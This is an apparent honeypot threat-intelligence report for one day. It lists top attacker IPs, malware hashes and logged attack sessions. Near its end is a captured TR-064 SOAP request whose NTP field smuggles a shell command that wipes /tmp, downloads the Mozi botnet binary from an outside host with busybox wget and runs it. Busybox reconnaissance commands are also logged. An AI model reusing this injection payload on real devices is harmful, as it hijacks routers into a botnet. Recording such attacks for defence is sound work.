@@ -1,0 +1,142 @@
+Top 5 IPs for 06-07-2024 :
+
+195.182.194.73
+220.136.128.140
+14.143.255.43
+170.106.65.5
+121.227.31.13
+
+Malware Observed:
+
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Commands/exploits observed:
+
+login: ...Password: \nLogin incorrect\nlogin: ...Password: \nLogin incorrect\nlogin: ...Password: \n......
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+.[4hadmin@ubuntu:~$ enable
+.[4lenable .
+enable :
+enable [
+enable alias
+enable bg
+enable bind
+enable break
+enable builtin
+enable caller
+enable cd
+enable command
+enable compgen
+enable complete
+enable continue
+enable declare
+enable dirs
+enable disown
+enable echo
+enable enable
+enable eval
+enable exec
+enable exit
+enable export
+enable false
+enable fc
+enable fg
+enable getopts
+enable hash
+enable help
+enable history
+enable jobs
+enable kill
+enable let
+enable local
+enable logout
+enable popd
+enable printf
+enable pushd
+enable pwd
+enable read
+enable readonly
+enable return
+enable set
+enable shift
+enable shopt
+enable source
+enable suspend
+enable test
+enable times
+enable trap
+enable true
+enable type
+enable typeset
+enable ulimit
+enable umask
+enable unalias
+enable unset
+enable wait
+.[4hadmin@ubuntu:~$ system
+-bash: system: command not found
+admin@ubuntu:~$ shell
+-bash: shell: command not found
+admin@ubuntu:~$ sh
+.[4l.[4hadmin@ubuntu:~$ cat /proc/mounts; /bin/busybox GYJHZ
+.[4lrootfs / rootfs rw 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=10240k,nr_inodes=997843,mode=755 0 0
+devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0
+tmpfs /run tmpfs rw,nosuid,relatime,size=1613336k,mode=755 0 0
+/dev/dm-0 / ext3 rw,relatime,errors=remount-ro,data=ordered 0 0
+tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0
+tmpfs /run/lock tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct 0 0
+fusectl /sys/fs/fuse/connections fusectl rw,relatime 0 0
+/dev/sda1 /boot ext2 rw,relatime 0 0
+/dev/mapper/home /home ext3 rw,relatime,data=ordered 0 0
+binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc rw,relatime 0 0
+.[4h.[4lGYJHZ: applet not found
+.[4hadmin@ubuntu:~$ cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GYJHZ
+.[4l.[4h.[4lcat: .s: No such file or directory
+.[4h.[4l.[4h.[4lGYJHZ: applet not found
+.[4hadmin@ubuntu:/dev/shm$ tftp; wget; /bin/busybox GYJHZ
+.[4lusage: tftp [-h] [-c C C] [-l L] [-g G] [-p P] [-r R] [hostname]
+.[4h.[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+.[4h.[4lGYJHZ: applet not found
+.[4hadmin@ubuntu:/dev/shm$ 
+
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:5555
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://221.0.223.187:43513/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
